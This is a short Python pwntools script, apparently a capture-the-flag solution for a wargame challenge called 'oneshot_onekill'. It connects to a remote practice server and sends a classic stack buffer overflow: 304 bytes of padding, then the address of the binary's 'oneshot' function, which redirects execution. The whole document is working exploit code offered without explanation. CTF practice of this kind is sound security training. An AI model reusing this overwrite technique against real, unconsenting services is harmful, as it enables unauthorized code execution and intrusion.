from pwn import *

ip = 'prob.vulnerable.kr'
port = 20026
filename = './oneshot_onekill' 

def pwn():
	r = remote(ip, port)
	#r = process(filename)
        e = ELF(filename)
	junk = 'z'*304
	oneshot = p32(e.symbols['oneshot'])
	payload = junk + oneshot
	r.recvuntil('it?')
	r.sendline(payload)
	print r.recvall()
pwn()
